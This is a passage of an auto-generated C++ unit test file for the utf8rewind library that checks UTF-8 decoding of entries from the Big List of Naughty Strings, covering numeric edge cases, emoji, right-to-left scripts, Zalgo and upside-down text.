/*
	DO NOT MODIFY, AUTO-GENERATED

	Generated on:
		2015-09-03T10:31:47

	Command line:
		E:\Projects\utf8rewind\tools\converter\blns.py
*/

#include "tests-base.hpp"

#include "../helpers/helpers-strings.hpp"

#define NAUGHTY_STRINGS_LENGTH 10370

class NaughtyStrings
	: public ::testing::Test
{

protected:

	void SetUp()
	{
		file.open("testdata/big-list-of-naughty-strings-master/blns.txt", std::ios_base::in);
		ASSERT_TRUE(file.is_open());
	}

	void TearDown()
	{
		file.close();
	}

	std::string ReadSection(size_t position, size_t length)
	{
		std::string result;

		file.seekg(position, std::ios::beg);
		if (file.eof())
		{
			return result;
		}

		result.resize(length + 1);
		file.read(&result[0], length);

		return result;
	}

	std::fstream file;

};

TEST_F(NaughtyStrings, ReservedStrings)
{
	EXPECT_STREQ(L"undefined", helpers::wide(ReadSection(68, 9)).c_str());
	EXPECT_STREQ(L"undef", helpers::wide(ReadSection(78, 5)).c_str());
	EXPECT_STREQ(L"null", helpers::wide(ReadSection(84, 4)).c_str());
	EXPECT_STREQ(L"NULL", helpers::wide(ReadSection(89, 4)).c_str());
	EXPECT_STREQ(L"(null)", helpers::wide(ReadSection(94, 6)).c_str());
	EXPECT_STREQ(L"nil", helpers::wide(ReadSection(101, 3)).c_str());
	EXPECT_STREQ(L"NIL", helpers::wide(ReadSection(105, 3)).c_str());
	EXPECT_STREQ(L"true", helpers::wide(ReadSection(109, 4)).c_str());
	EXPECT_STREQ(L"false", helpers::wide(ReadSection(114, 5)).c_str());
	EXPECT_STREQ(L"True", helpers::wide(ReadSection(120, 4)).c_str());
	EXPECT_STREQ(L"False", helpers::wide(ReadSection(125, 5)).c_str());
	EXPECT_STREQ(L"None", helpers::wide(ReadSection(131, 4)).c_str());
	EXPECT_STREQ(L"\\", helpers::wide(ReadSection(136, 1)).c_str());
	EXPECT_STREQ(L"\\\\", helpers::wide(ReadSection(138, 2)).c_str());
}

TEST_F(NaughtyStrings, NumericStrings)
{
	EXPECT_STREQ(L"0", helpers::wide(ReadSection(209, 1)).c_str());
	EXPECT_STREQ(L"1", helpers::wide(ReadSection(211, 1)).c_str());
	EXPECT_STREQ(L"1.00", helpers::wide(ReadSection(213, 4)).c_str());
	EXPECT_STREQ(L"$1.00", helpers::wide(ReadSection(218, 5)).c_str());
	EXPECT_STREQ(L"1/2", helpers::wide(ReadSection(224, 3)).c_str());
	EXPECT_STREQ(L"1E2", helpers::wide(ReadSection(228, 3)).c_str());
	EXPECT_STREQ(L"1E02", helpers::wide(ReadSection(232, 4)).c_str());
	EXPECT_STREQ(L"1E+02", helpers::wide(ReadSection(237, 5)).c_str());
	EXPECT_STREQ(L"-1", helpers::wide(ReadSection(243, 2)).c_str());
	EXPECT_STREQ(L"-1.00", helpers::wide(ReadSection(246, 5)).c_str());
	EXPECT_STREQ(L"-$1.00", helpers::wide(ReadSection(252, 6)).c_str());
	EXPECT_STREQ(L"-1/2", helpers::wide(ReadSection(259, 4)).c_str());
	EXPECT_STREQ(L"-1E2", helpers::wide(ReadSection(264, 4)).c_str());
	EXPECT_STREQ(L"-1E02", helpers::wide(ReadSection(269, 5)).c_str());
	EXPECT_STREQ(L"-1E+02", helpers::wide(ReadSection(275, 6)).c_str());
	EXPECT_STREQ(L"1/0", helpers::wide(ReadSection(282, 3)).c_str());
	EXPECT_STREQ(L"0/0", helpers::wide(ReadSection(286, 3)).c_str());
	EXPECT_STREQ(L"-2147483648/-1", helpers::wide(ReadSection(290, 14)).c_str());
	EXPECT_STREQ(L"-9223372036854775808/-1", helpers::wide(ReadSection(305, 23)).c_str());
	EXPECT_STREQ(L"0.00", helpers::wide(ReadSection(329, 4)).c_str());
	EXPECT_STREQ(L"0..0", helpers::wide(ReadSection(334, 4)).c_str());
	EXPECT_STREQ(L".", helpers::wide(ReadSection(339, 1)).c_str());
	EXPECT_STREQ(L"0.0.0", helpers::wide(ReadSection(341, 5)).c_str());
	EXPECT_STREQ(L"0,00", helpers::wide(ReadSection(347, 4)).c_str());
	EXPECT_STREQ(L"0,,0", helpers::wide(ReadSection(352, 4)).c_str());
	EXPECT_STREQ(L",", helpers::wide(ReadSection(357, 1)).c_str());
	EXPECT_STREQ(L"0,0,0", helpers::wide(ReadSection(359, 5)).c_str());
	EXPECT_STREQ(L"0.0/0", helpers::wide(ReadSection(365, 5)).c_str());
	EXPECT_STREQ(L"1.0/0.0", helpers::wide(ReadSection(371, 7)).c_str());
	EXPECT_STREQ(L"0.0/0.0", helpers::wide(ReadSection(379, 7)).c_str());
	EXPECT_STREQ(L"1,0/0,0", helpers::wide(ReadSection(387, 7)).c_str());
	EXPECT_STREQ(L"0,0/0,0", helpers::wide(ReadSection(395, 7)).c_str());
	EXPECT_STREQ(L"--1", helpers::wide(ReadSection(403, 3)).c_str());
	EXPECT_STREQ(L"-", helpers::wide(ReadSection(407, 1)).c_str());
	EXPECT_STREQ(L"-.", helpers::wide(ReadSection(409, 2)).c_str());
	EXPECT_STREQ(L"-,", helpers::wide(ReadSection(412, 2)).c_str());
	EXPECT_STREQ(L"999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999", helpers::wide(ReadSection(415, 96)).c_str());
	EXPECT_STREQ(L"NaN", helpers::wide(ReadSection(512, 3)).c_str());
	EXPECT_STREQ(L"Infinity", helpers::wide(ReadSection(516, 8)).c_str());
	EXPECT_STREQ(L"-Infinity", helpers::wide(ReadSection(525, 9)).c_str());
	EXPECT_STREQ(L"0x0", helpers::wide(ReadSection(535, 3)).c_str());
	EXPECT_STREQ(L"0xffffffff", helpers::wide(ReadSection(539, 10)).c_str());
	EXPECT_STREQ(L"0xffffffffffffffff", helpers::wide(ReadSection(550, 18)).c_str());
	EXPECT_STREQ(L"0xabad1dea", helpers::wide(ReadSection(569, 10)).c_str());
	EXPECT_STREQ(L"123456789012345678901234567890123456789", helpers::wide(ReadSection(580, 39)).c_str());
	EXPECT_STREQ(L"1,000.00", helpers::wide(ReadSection(620, 8)).c_str());
	EXPECT_STREQ(L"1 000.00", helpers::wide(ReadSection(629, 8)).c_str());
	EXPECT_STREQ(L"1'000.00", helpers::wide(ReadSection(638, 8)).c_str());
	EXPECT_STREQ(L"1,000,000.00", helpers::wide(ReadSection(647, 12)).c_str());
	EXPECT_STREQ(L"1 000 000.00", helpers::wide(ReadSection(660, 12)).c_str());
	EXPECT_STREQ(L"1'000'000.00", helpers::wide(ReadSection(673, 12)).c_str());
	EXPECT_STREQ(L"1.000,00", helpers::wide(ReadSection(686, 8)).c_str());
	EXPECT_STREQ(L"1 000,00", helpers::wide(ReadSection(695, 8)).c_str());
	EXPECT_STREQ(L"1'000,00", helpers::wide(ReadSection(704, 8)).c_str());
	EXPECT_STREQ(L"1.000.000,00", helpers::wide(ReadSection(713, 12)).c_str());
	EXPECT_STREQ(L"1 000 000,00", helpers::wide(ReadSection(726, 12)).c_str());
	EXPECT_STREQ(L"1'000'000,00", helpers::wide(ReadSection(739, 12)).c_str());
	EXPECT_STREQ(L"01000", helpers::wide(ReadSection(752, 5)).c_str());
	EXPECT_STREQ(L"08", helpers::wide(ReadSection(758, 2)).c_str());
	EXPECT_STREQ(L"09", helpers::wide(ReadSection(761, 2)).c_str());
	EXPECT_STREQ(L"2.2250738585072011e-308", helpers::wide(ReadSection(764, 23)).c_str());
}

TEST_F(NaughtyStrings, SpecialCharacters)
{
	EXPECT_STREQ(L",./;'[]\\-=", helpers::wide(ReadSection(894, 10)).c_str());
	EXPECT_STREQ(L"<>?:\"{}|_+", helpers::wide(ReadSection(905, 10)).c_str());
	EXPECT_STREQ(L"!@#$%^&*()`~", helpers::wide(ReadSection(916, 12)).c_str());
}

TEST_F(NaughtyStrings, UnicodeSymbols)
{
	EXPECT_STREQ(L"\x3A9\x2248\xE7\x221A\x222B\x2DC\xB5\x2264\x2265\xF7", helpers::wide(ReadSection(1018, 25)).c_str());
	EXPECT_STREQ(L"\xE5\xDF\x2202\x192\xA9\x2D9\x2206\x2DA\xAC\x2026\xE6", helpers::wide(ReadSection(1044, 25)).c_str());
	EXPECT_STREQ(L"\x153\x2211\xB4\xAE\x2020\xA5\xA8\x2C6\xF8\x3C0\x201C\x2018", helpers::wide(ReadSection(1070, 28)).c_str());
	EXPECT_STREQ(L"\xA1\x2122\xA3\xA2\x221E\xA7\xB6\x2022\xAA\xBA\x2013\x2260", helpers::wide(ReadSection(1099, 29)).c_str());
	EXPECT_STREQ(L"\xB8\x2DB\xC7\x25CA\x131\x2DC\xC2\xAF\x2D8\xBF", helpers::wide(ReadSection(1129, 21)).c_str());
	EXPECT_STREQ(L"\xC5\xCD\xCE\xCF\x2DD\xD3\xD4\xF8FF\xD2\xDA\xC6\x2603", helpers::wide(ReadSection(1151, 26)).c_str());
	EXPECT_STREQ(L"\x152\x201E\xB4\x2030\x2C7\xC1\xA8\x2C6\xD8\x220F\x201D\x2019", helpers::wide(ReadSection(1178, 29)).c_str());
	EXPECT_STREQ(L"`\x2044\x20AC\x2039\x203A\xFB01\xFB02\x2021\xB0\xB7\x201A\x2014\xB1", helpers::wide(ReadSection(1208, 34)).c_str());
	EXPECT_STREQ(L"\x215B\x215C\x215D\x215E", helpers::wide(ReadSection(1243, 12)).c_str());
	EXPECT_STREQ(L"\x401\x402\x403\x404\x405\x406\x407\x408\x409\x40A\x40B\x40C\x40D\x40E\x40F\x410\x411\x412\x413\x414\x415\x416\x417\x418\x419\x41A\x41B\x41C\x41D\x41E\x41F\x420\x421\x422\x423\x424\x425\x426\x427\x428\x429\x42A\x42B\x42C\x42D\x42E\x42F\x430\x431\x432\x433\x434\x435\x436\x437\x438\x439\x43A\x43B\x43C\x43D\x43E\x43F\x440\x441\x442\x443\x444\x445\x446\x447\x448\x449\x44A\x44B\x44C\x44D\x44E\x44F", helpers::wide(ReadSection(1256, 158)).c_str());
	EXPECT_STREQ(L"\x660\x661\x662\x663\x664\x665\x666\x667\x668\x669", helpers::wide(ReadSection(1415, 20)).c_str());
}

TEST_F(NaughtyStrings, UnicodeSubscriptSuperscript)
{
	EXPECT_STREQ(L"\x2070\x2074\x2075", helpers::wide(ReadSection(1556, 9)).c_str());
	EXPECT_STREQ(L"\x2080\x2081\x2082", helpers::wide(ReadSection(1566, 9)).c_str());
	EXPECT_STREQ(L"\x2070\x2074\x2075\x2080\x2081\x2082", helpers::wide(ReadSection(1576, 18)).c_str());
}

TEST_F(NaughtyStrings, QuotationMarks)
{
	EXPECT_STREQ(L"'", helpers::wide(ReadSection(1694, 1)).c_str());
	EXPECT_STREQ(L"\"", helpers::wide(ReadSection(1696, 1)).c_str());
	EXPECT_STREQ(L"''", helpers::wide(ReadSection(1698, 2)).c_str());
	EXPECT_STREQ(L"\"\"", helpers::wide(ReadSection(1701, 2)).c_str());
	EXPECT_STREQ(L"'\"'", helpers::wide(ReadSection(1704, 3)).c_str());
	EXPECT_STREQ(L"\"''''\"'\"", helpers::wide(ReadSection(1708, 8)).c_str());
	EXPECT_STREQ(L"\"'\"'\"''''\"", helpers::wide(ReadSection(1717, 10)).c_str());
}

TEST_F(NaughtyStrings, TwoByteCharacters)
{
#if UTF8_WCHAR_UTF16
	EXPECT_STREQ(L"\x7530\x4E2D\x3055\x3093\x306B\x3042\x3052\x3066\x4E0B\x3055\x3044", helpers::wide(ReadSection(1853, 33)).c_str());
	EXPECT_STREQ(L"\x30D1\x30FC\x30C6\x30A3\x30FC\x3078\x884C\x304B\x306A\x3044\x304B", helpers::wide(ReadSection(1887, 33)).c_str());
	EXPECT_STREQ(L"\x548C\x88FD\x6F22\x8A9E", helpers::wide(ReadSection(1921, 12)).c_str());
	EXPECT_STREQ(L"\x90E8\x843D\x683C", helpers::wide(ReadSection(1934, 9)).c_str());
	EXPECT_STREQ(L"\xC0AC\xD68C\xACFC\xD559\xC6D0 \xC5B4\xD559\xC5F0\xAD6C\xC18C", helpers::wide(ReadSection(1944, 31)).c_str());
	EXPECT_STREQ(L"\xCC26\xCC28\xB97C \xD0C0\xACE0 \xC628 \xD3B2\xC2DC\xB9E8\xACFC \xC45B\xB2E4\xB9AC \xB620\xBC29\xAC01\xD558", helpers::wide(ReadSection(1976, 56)).c_str());
	EXPECT_STREQ(L"\x793E\x6703\x79D1\x5B78\x9662\x8A9E\x5B78\x7814\x7A76\x6240", helpers::wide(ReadSection(2033, 30)).c_str());
	EXPECT_STREQ(L"\xC6B8\xB780\xBC14\xD1A0\xB974", helpers::wide(ReadSection(2064, 15)).c_str());
	EXPECT_STREQ(L"\xD841\xDF0E\xD841\xDF31\xD841\xDF79\xD843\xDC53\xD843\xDC78\xD843\xDC96\xD843\xDCCF", helpers::wide(ReadSection(2080, 28)).c_str());
#elif UTF8_WCHAR_UTF32
	EXPECT_STREQ(L"\x7530\x4E2D\x3055\x3093\x306B\x3042\x3052\x3066\x4E0B\x3055\x3044", helpers::wide(ReadSection(1853, 33)).c_str());
	EXPECT_STREQ(L"\x30D1\x30FC\x30C6\x30A3\x30FC\x3078\x884C\x304B\x306A\x3044\x304B", helpers::wide(ReadSection(1887, 33)).c_str());
	EXPECT_STREQ(L"\x548C\x88FD\x6F22\x8A9E", helpers::wide(ReadSection(1921, 12)).c_str());
	EXPECT_STREQ(L"\x90E8\x843D\x683C", helpers::wide(ReadSection(1934, 9)).c_str());
	EXPECT_STREQ(L"\xC0AC\xD68C\xACFC\xD559\xC6D0 \xC5B4\xD559\xC5F0\xAD6C\xC18C", helpers::wide(ReadSection(1944, 31)).c_str());
	EXPECT_STREQ(L"\xCC26\xCC28\xB97C \xD0C0\xACE0 \xC628 \xD3B2\xC2DC\xB9E8\xACFC \xC45B\xB2E4\xB9AC \xB620\xBC29\xAC01\xD558", helpers::wide(ReadSection(1976, 56)).c_str());
	EXPECT_STREQ(L"\x793E\x6703\x79D1\x5B78\x9662\x8A9E\x5B78\x7814\x7A76\x6240", helpers::wide(ReadSection(2033, 30)).c_str());
	EXPECT_STREQ(L"\xC6B8\xB780\xBC14\xD1A0\xB974", helpers::wide(ReadSection(2064, 15)).c_str());
	EXPECT_STREQ(L"\x2070E\x20731\x20779\x20C53\x20C78\x20C96\x20CCF", helpers::wide(ReadSection(2080, 28)).c_str());
#endif
}

TEST_F(NaughtyStrings, JapaneseEmoticons)
{
	EXPECT_STREQ(L"\x30FD\xF3C\xE88\x644\x35C\xE88\xF3D\xFF89 \x30FD\xF3C\xE88\x644\x35C\xE88\xF3D\xFF89 ", helpers::wide(ReadSection(2216, 46)).c_str());
	EXPECT_STREQ(L"(\xFF61\x25D5 \x2200 \x25D5\xFF61)", helpers::wide(ReadSection(2263, 19)).c_str());
	EXPECT_STREQ(L"\xFF40\xFF68(\xB4\x2200\xFF40\x2229", helpers::wide(ReadSection(2283, 18)).c_str());
	EXPECT_STREQ(L"__\xFF9B(,_,*)", helpers::wide(ReadSection(2302, 11)).c_str());
	EXPECT_STREQ(L"\x30FB(\xFFE3\x2200\xFFE3)\x30FB:*:", helpers::wide(ReadSection(2314, 20)).c_str());
	EXPECT_STREQ(L"\xFF9F\xFF65\x273F\x30FE\x2572(\xFF61\x25D5\x203F\x25D5\xFF61)\x2571\x273F\xFF65\xFF9F", helpers::wide(ReadSection(2335, 44)).c_str());
	EXPECT_STREQ(L",\x3002\x30FB:*:\x30FB\x309C\x2019( \x263B \x3C9 \x263B )\x3002\x30FB:*:\x30FB\x309C\x2019", helpers::wide(ReadSection(2380, 51)).c_str());
	EXPECT_STREQ(L"(\x256F\xB0\x25A1\xB0\xFF09\x256F\xFE35 \x253B\x2501\x253B)  ", helpers::wide(ReadSection(2432, 33)).c_str());
	EXPECT_STREQ(L"(\xFF89\xCA5\x76CA\xCA5\xFF09\xFF89\xFEFF \x253B\x2501\x253B", helpers::wide(ReadSection(2466, 32)).c_str());
	EXPECT_STREQ(L"( \x361\xB0 \x35C\x296 \x361\xB0)", helpers::wide(ReadSection(2499, 17)).c_str());
}

TEST_F(NaughtyStrings, Emoji)
{
#if UTF8_WCHAR_UTF16
	EXPECT_STREQ(L"\xD83D\xDE0D", helpers::wide(ReadSection(2627, 4)).c_str());
	EXPECT_STREQ(L"\xD83D\xDC69\xD83C\xDFFD", helpers::wide(ReadSection(2632, 8)).c_str());
	EXPECT_STREQ(L"\xD83D\xDC7E \xD83D\xDE47 \xD83D\xDC81 \xD83D\xDE45 \xD83D\xDE46 \xD83D\xDE4B \xD83D\xDE4E \xD83D\xDE4D ", helpers::wide(ReadSection(2641, 40)).c_str());
	EXPECT_STREQ(L"\xD83D\xDC35 \xD83D\xDE48 \xD83D\xDE49 \xD83D\xDE4A", helpers::wide(ReadSection(2682, 19)).c_str());
	EXPECT_STREQ(L"\x2764\xFE0F \xD83D\xDC94 \xD83D\xDC8C \xD83D\xDC95 \xD83D\xDC9E \xD83D\xDC93 \xD83D\xDC97 \xD83D\xDC96 \xD83D\xDC98 \xD83D\xDC9D \xD83D\xDC9F \xD83D\xDC9C \xD83D\xDC9B \xD83D\xDC9A \xD83D\xDC99", helpers::wide(ReadSection(2702, 76)).c_str());
	EXPECT_STREQ(L"\x270B\xD83C\xDFFF \xD83D\xDCAA\xD83C\xDFFF \xD83D\xDC50\xD83C\xDFFF \xD83D\xDE4C\xD83C\xDFFF \xD83D\xDC4F\xD83C\xDFFF \xD83D\xDE4F\xD83C\xDFFF", helpers::wide(ReadSection(2779, 52)).c_str());
	EXPECT_STREQ(L"\xD83D\xDEBE \xD83C\xDD92 \xD83C\xDD93 \xD83C\xDD95 \xD83C\xDD96 \xD83C\xDD97 \xD83C\xDD99 \xD83C\xDFE7", helpers::wide(ReadSection(2832, 39)).c_str());
	EXPECT_STREQ(L"0\xFE0F\x20E3 1\xFE0F\x20E3 2\xFE0F\x20E3 3\xFE0F\x20E3 4\xFE0F\x20E3 5\xFE0F\x20E3 6\xFE0F\x20E3 7\xFE0F\x20E3 8\xFE0F\x20E3 9\xFE0F\x20E3 \xD83D\xDD1F", helpers::wide(ReadSection(2872, 84)).c_str());
#elif UTF8_WCHAR_UTF32
	EXPECT_STREQ(L"\x1F60D", helpers::wide(ReadSection(2627, 4)).c_str());
	EXPECT_STREQ(L"\x1F469\x1F3FD", helpers::wide(ReadSection(2632, 8)).c_str());
	EXPECT_STREQ(L"\x1F47E \x1F647 \x1F481 \x1F645 \x1F646 \x1F64B \x1F64E \x1F64D ", helpers::wide(ReadSection(2641, 40)).c_str());
	EXPECT_STREQ(L"\x1F435 \x1F648 \x1F649 \x1F64A", helpers::wide(ReadSection(2682, 19)).c_str());
	EXPECT_STREQ(L"\x2764\xFE0F \x1F494 \x1F48C \x1F495 \x1F49E \x1F493 \x1F497 \x1F496 \x1F498 \x1F49D \x1F49F \x1F49C \x1F49B \x1F49A \x1F499", helpers::wide(ReadSection(2702, 76)).c_str());
	EXPECT_STREQ(L"\x270B\x1F3FF \x1F4AA\x1F3FF \x1F450\x1F3FF \x1F64C\x1F3FF \x1F44F\x1F3FF \x1F64F\x1F3FF", helpers::wide(ReadSection(2779, 52)).c_str());
	EXPECT_STREQ(L"\x1F6BE \x1F192 \x1F193 \x1F195 \x1F196 \x1F197 \x1F199 \x1F3E7", helpers::wide(ReadSection(2832, 39)).c_str());
	EXPECT_STREQ(L"0\xFE0F\x20E3 1\xFE0F\x20E3 2\xFE0F\x20E3 3\xFE0F\x20E3 4\xFE0F\x20E3 5\xFE0F\x20E3 6\xFE0F\x20E3 7\xFE0F\x20E3 8\xFE0F\x20E3 9\xFE0F\x20E3 \x1F51F", helpers::wide(ReadSection(2872, 84)).c_str());
#endif
}

TEST_F(NaughtyStrings, UnicodeNumbers)
{
	EXPECT_STREQ(L"\xFF11\xFF12\xFF13", helpers::wide(ReadSection(3081, 9)).c_str());
	EXPECT_STREQ(L"\x661\x662\x663", helpers::wide(ReadSection(3091, 6)).c_str());
}

TEST_F(NaughtyStrings, RightToLeftStrings)
{
	EXPECT_STREQ(L"\x62B\x645 \x646\x641\x633 \x633\x642\x637\x62A \x648\x628\x627\x644\x62A\x62D\x62F\x64A\x62F\x60C, \x62C\x632\x64A\x631\x62A\x64A \x628\x627\x633\x62A\x62E\x62F\x627\x645 \x623\x646 \x62F\x646\x648. \x625\x630 \x647\x646\x627\x61F \x627\x644\x633\x62A\x627\x631 \x648\x62A\x646\x635\x64A\x628 \x643\x627\x646. \x623\x647\x651\x644 \x627\x64A\x637\x627\x644\x64A\x627\x60C \x628\x631\x64A\x637\x627\x646\x64A\x627-\x641\x631\x646\x633\x627 \x642\x62F \x623\x62E\x630. \x633\x644\x64A\x645\x627\x646\x60C \x625\x62A\x641\x627\x642\x64A\x629 \x628\x64A\x646 \x645\x627, \x64A\x630\x643\x631 \x627\x644\x62D\x62F\x648\x62F \x623\x64A \x628\x639\x62F, \x645\x639\x627\x645\x644\x629 \x628\x648\x644\x646\x62F\x627\x60C \x627\x644\x625\x637\x644\x627\x642 \x639\x644 \x625\x64A\x648.", helpers::wide(ReadSection(3217, 334)).c_str());
	EXPECT_STREQ(L"\x5D1\x5B0\x5BC\x5E8\x5B5\x5D0\x5E9\x5B4\x5C1\x5D9\x5EA, \x5D1\x5B8\x5BC\x5E8\x5B8\x5D0 \x5D0\x5B1\x5DC\x5B9\x5D4\x5B4\x5D9\x5DD, \x5D0\x5B5\x5EA \x5D4\x5B7\x5E9\x5B8\x5BC\x5C1\x5DE\x5B7\x5D9\x5B4\x5DD, \x5D5\x5B0\x5D0\x5B5\x5EA \x5D4\x5B8\x5D0\x5B8\x5E8\x5B6\x5E5", helpers::wide(ReadSection(3552, 111)).c_str());
	EXPECT_STREQ(L"\x5D4\x5B8\x5D9\x5B0\x5EA\x5B8\x5D4" L"test\x627\x644\x635\x641\x62D\x627\x62A \x627\x644\x62A\x651\x62D\x648\x644", helpers::wide(ReadSection(3664, 47)).c_str());
	EXPECT_STREQ(L"\xFDFD", helpers::wide(ReadSection(3712, 3)).c_str());
	EXPECT_STREQ(L"\xFDFA", helpers::wide(ReadSection(3716, 3)).c_str());
}

TEST_F(NaughtyStrings, UnicodeSpaces)
{
	EXPECT_STREQ(L"\x200B", helpers::wide(ReadSection(3871, 3)).c_str());
	EXPECT_STREQ(L"\x1680", helpers::wide(ReadSection(3875, 3)).c_str());
	EXPECT_STREQ(L"\x180E", helpers::wide(ReadSection(3879, 3)).c_str());
	EXPECT_STREQ(L"\x3000", helpers::wide(ReadSection(3883, 3)).c_str());
	EXPECT_STREQ(L"\xFEFF", helpers::wide(ReadSection(3887, 3)).c_str());
	EXPECT_STREQ(L"\x2423", helpers::wide(ReadSection(3891, 3)).c_str());
	EXPECT_STREQ(L"\x2422", helpers::wide(ReadSection(3895, 3)).c_str());
	EXPECT_STREQ(L"\x2421", helpers::wide(ReadSection(3899, 3)).c_str());
}

TEST_F(NaughtyStrings, TrickUnicode)
{
	EXPECT_STREQ(L"\x202A\x202A" L"test\x202A", helpers::wide(ReadSection(4060, 13)).c_str());
	EXPECT_STREQ(L"\x202B" L"test\x202B", helpers::wide(ReadSection(4074, 10)).c_str());
	EXPECT_STREQ(L"\x2029" L"test\x2029", helpers::wide(ReadSection(4085, 10)).c_str());
	EXPECT_STREQ(L"test\x2060" L"test\x202B", helpers::wide(ReadSection(4096, 14)).c_str());
	EXPECT_STREQ(L"\x2066" L"test\x2067", helpers::wide(ReadSection(4111, 10)).c_str());
}

TEST_F(NaughtyStrings, ZalgoText)
{
	EXPECT_STREQ(L"\x1E70\x33A\x33A\x315" L"o\x35E \x337" L"i\x332\x32C\x347\x32A\x359" L"n\x31D\x317\x355" L"v\x31F\x31C\x318\x326\x35F" L"o\x336\x319\x330\x320" L"k\xE8\x35A\x32E\x33A\x32A\x339\x331\x324 \x316" L"t\x31D\x355\x333\x323\x33B\x32A\x35E" L"h\x33C\x353\x332\x326\x333\x318\x332" L"e\x347\x323\x330\x326\x32C\x34E \x322\x33C\x33B\x331\x318" L"h\x35A\x34E\x359\x31C\x323\x332\x345" L"i\x326\x332\x323\x330\x324" L"v\x33B\x34D" L"e\x33A\x32D\x333\x32A\x330-m\x322" L"i\x345" L"n\x316\x33A\x31E\x332\x32F\x330" L"d\x335\x33C\x31F\x359\x329\x33C\x318\x333 \x31E\x325\x331\x333\x32D" L"r\x31B\x317\x318" L"e\x359" L"p\x360" L"r\x33C\x31E\x33B\x32D\x317" L"e\x33A\x320\x323\x35F" L"s\x318\x347\x333\x34D\x31D\x349" L"e\x349\x325\x32F\x31E\x332\x35A\x32C\x35C\x1F9\x32C\x34E\x34E\x31F\x316\x347\x324" L"t\x34D\x32C\x324\x353\x33C\x32D\x358\x345" L"i\x32A\x331" L"n\x360" L"g\x334\x349 \x34F\x349\x345" L"c\x32C\x31F" L"h\x361" L"a\x32B\x33B\x32F\x358" L"o\x32B\x31F\x316\x34D\x319\x31D\x349" L"s\x317\x326\x332.\x328\x339\x348\x323", helpers::wide(ReadSection(4266, 381)).c_str());
	EXPECT_STREQ(L"\x321\x353\x31E\x345I\x317\x318\x326\x35D" L"n\x347\x347\x359" L"v\x32E\x32B" L"ok\x332\x32B\x319\x348" L"i\x316\x359\x32D\x339\x320\x31E" L"n\x321\x33B\x32E\x323\x33A" L"g\x332\x348\x359\x32D\x359\x32C\x34E \x330" L"t\x354\x326" L"h\x31E\x332" L"e\x322\x324 \x34D\x32C\x332\x356" L"f\x334\x318\x355\x323\xE8\x356\x1EB9\x325\x329" L"l\x356\x354\x35A" L"i\x353\x35A\x326\x360" L"n\x356\x34D\x317\x353\x333\x32E" L"g\x34D \x328" L"o\x35A\x32A\x361" L"f\x318\x323\x32C \x316\x318\x356\x31F\x359\x32E" L"c\x489\x354\x32B\x356\x353\x347\x356\x345" L"h\x335\x324\x323\x35A\x354\xE1\x317\x33C\x355\x345" L"o\x33C\x323\x325" L"s\x331\x348\x33A\x316\x326\x33B\x362.\x31B\x316\x31E\x320\x32B\x330", helpers::wide(ReadSection(4648, 260)).c_str());
	EXPECT_STREQ(L"\x317\x33A\x356\x339\x32F\x353\x1E6E\x324\x34D\x325\x347\x348" L"h\x332\x301" L"e\x34F\x353\x33C\x317\x319\x33C\x323\x354 \x347\x31C\x331\x320\x353\x34D\x345N\x355\x360" L"e\x317\x331z\x318\x31D\x31C\x33A\x359" L"p\x324\x33A\x339\x34D\x32F\x35A" L"e\x320\x33B\x320\x35C" L"r\x328\x324\x34D\x33A\x316\x354\x316\x316" L"d\x320\x31F\x32D\x32C\x31D\x35F" L"i\x326\x356\x329\x353\x354\x324" L"a\x320\x317\x32C\x349\x319" L"n\x35A\x35C \x33B\x31E\x330\x35A\x345" L"h\x335\x349" L"i\x333\x31E" L"v\x322\x347\x1E19\x34E\x35F-\x489\x32D\x329\x33C\x354" L"m\x324\x32D\x32B" L"i\x355\x347\x31D\x326" L"n\x317\x359\x1E0D\x31F \x32F\x332\x355\x35E\x1EB\x31F\x32F\x330\x332\x359\x33B\x31D" L"f \x32A\x330\x330\x317\x316\x32D\x318\x358" L"c\x326\x34D\x332\x31E\x34D\x329\x319\x1E25\x35A" L"a\x32E\x34E\x31F\x319\x35C\x1A1\x329\x339\x34E" L"s\x324.\x31D\x31D \x489Z\x321\x316\x31C\x356\x330\x323\x349\x31C" L"a\x356\x330\x359\x32C\x361" L"l\x332\x32B\x333\x34D\x329" L"g\x321\x31F\x33C\x331\x35A\x31E\x32C\x345" L"o\x317\x35C.\x31F", helpers::wide(ReadSection(4909, 391)).c_str());
	EXPECT_STREQ(L"\x326H\x32C\x324\x317\x324\x35D" L"e\x35C \x31C\x325\x31D\x33B\x34D\x31F\x301w\x315" L"h\x316\x32F\x353" L"o\x31D\x359\x316\x34E\x331\x32E \x489\x33A\x319\x31E\x31F\x348W\x337\x33C\x32D" L"a\x33A\x32A\x34D\x12F\x348\x355\x32D\x359\x32F\x31C" L"t\x336\x33C\x32E" L"s\x318\x359\x356\x315 \x320\x32B\x320" L"B\x33B\x34D\x359\x349\x333\x345" L"e\x335" L"h\x335\x32C\x347\x32B\x359" L"i\x339\x353\x333\x333\x32E\x34E\x32B\x315" L"n\x35F" L"d\x334\x32A\x31C\x316 \x330\x349\x329\x347\x359\x332\x35E\x345T\x356\x33C\x353\x32A\x362" L"h\x34F\x353\x32E\x33B" L"e\x32C\x31D\x31F\x345 \x324\x339\x31DW\x359\x31E\x31D\x354\x347\x35D\x345" L"a\x34F\x353\x354\x339\x33C\x323" L"l\x334\x354\x330\x324\x31F\x354\x1E3D\x32B.\x355", helpers::wide(ReadSection(5301, 276)).c_str());
	EXPECT_STREQ(L"Z\x32E\x31E\x320\x359\x354\x345\x1E00\x317\x31E\x348\x33B\x317\x1E36\x359\x34E\x32F\x339\x31E\x353G\x33BO\x32D\x317\x32E", helpers::wide(ReadSection(5578, 51)).c_str());
}

TEST_F(NaughtyStrings, UnicodeUpsidedown)
{
	EXPECT_STREQ(L"\x2D9\x250" L"nb\x1D09" L"l\x250 \x250" L"u\x183\x250\x26F \x1DD\x279" L"olop \x287\x1DD \x1DD\x279" L"oq\x250" L"l \x287" L"n \x287" L"unp\x1D09" L"p\x1D09\x254" L"u\x1D09 \x279" L"od\x26F\x1DD\x287 po\x26F" L"sn\x1D09\x1DD op p\x1DD" L"s '\x287\x1D09" L"l\x1DD \x183" L"u\x1D09\x254" L"s\x1D09" L"d\x1D09" L"p\x250 \x279" L"n\x287\x1DD\x287\x254\x1DD" L"suo\x254 '\x287\x1DD\x26F\x250 \x287\x1D09" L"s \x279" L"olop \x26F" L"nsd\x1D09 \x26F\x1DD\x279" L"o\x2E5", helpers::wide(ReadSection(5751, 192)).c_str());
	EXPECT_STREQ(L"00\x2D9\x196$-", helpers::wide(ReadSection(5944, 8)).c_str());
}

TEST_F(NaughtyStrings, UnicodeFont)
{
#if UTF8_WCHAR_UTF16
